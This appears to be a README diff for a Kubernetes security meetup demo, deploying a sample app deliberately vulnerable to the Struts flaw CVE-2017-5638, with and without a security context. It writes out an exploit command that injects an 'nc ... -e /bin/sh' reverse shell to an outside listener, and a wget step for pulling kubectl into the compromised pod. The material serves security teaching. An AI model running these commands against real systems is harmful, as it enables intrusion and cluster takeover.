@@ -1,0 +1,22 @@
+= Kubernetes security presentation
+
+This repository contains manifest files for a presentation about Kubernetes security held at a
+meetup of the "München Kubernetes/Cloud-Native Meetup" group.
+
+In order to deploy the sample application: `kustomize build sample-app/base | kubectl apply -f -`
+
+In order to deploy the sample application with security context in place:
+`kustomize build sample-app/overlays/3 | kubectl apply -f -`
+
+The application has the CVE-2017-5638 vulnerability. The vulnerability can be exploited with,
+for example, the exploit script at https://github.com/mazen160/struts-pwn.
+
+The exploit can be run with
+`python struts-pwn.py --url  "http://$SAMPLE_APP_ADDRESS/hello" -c 'nc 10.34.136.172 8080 -e "/bin/sh" &'`
+
+Assuming you have a server at `10.34.136.172` with `nc -lk 8080` running.
+
+To demonstrate the possibilities of an attacker inside the pod you can, among other things,
+download `kubectl` and run it (adjust Kubernetes cluster version as needed):
+
+`wget -q http://storage.googleapis.com/kubernetes-release/release/v1.14.3/bin/linux/amd64/kubectl`
